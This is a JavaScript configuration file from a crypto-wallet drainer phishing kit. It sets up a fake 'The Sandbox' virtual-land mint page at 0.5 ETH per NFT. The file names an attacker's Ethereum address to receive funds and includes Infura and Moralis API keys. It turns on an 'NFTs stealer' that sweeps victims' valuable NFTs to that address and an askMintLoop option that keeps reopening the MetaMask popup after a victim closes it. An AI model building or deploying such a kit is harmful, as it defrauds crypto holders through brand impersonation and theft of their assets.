const address = "0x267917f9eE1f8DBCb95e92e6Da82233D999e247b";
const infuraId = "c52457df89bc42fcaa89b6babc7e607f"     // Infuria ID | https://infura.io/ | For Wallet Connect
const moralisApi = "l6ZoJSnpax9hN8isbl0PDv64Kr9y0VzRWUB5YGekwSQ4Qgt5E9ZU4pG5Hg8Bc0dL"    // x-api-key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "The Sandbox",
    title: "Alpha Season 3 Virtual Lands", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "04/27/2022",
    socialMedia: {
        discord: "https://discord.com/invite/thesandboxgame",
        twitter: "https://twitter.com/thesandboxgame",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "the-sandbox.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.5,         // Price per NFT.
    totalSupply: 500,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 10,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "0x267917f9eE1f8DBCb95e92e6Da82233D999e247b" // leave empty if you want to use the same address 
}

/* 
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
